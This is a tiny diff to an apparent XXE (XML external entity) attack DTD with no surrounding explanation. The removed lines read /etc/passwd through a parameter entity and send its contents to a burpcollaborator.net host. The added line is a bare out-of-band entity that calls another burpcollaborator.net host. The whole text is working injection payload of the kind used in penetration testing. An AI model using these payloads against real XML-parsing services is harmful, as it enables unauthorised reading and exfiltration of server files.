@@ -1,3 +1,1 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-
-<!ENTITY % files SYSTEM "https://aq.1celh9920n7vfh7lwr5y5v3uqlwgk5.burpcollaborator.net?%file;"> %files;
+<!ENTITY % aaa SYSTEM "https://aaa.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net">
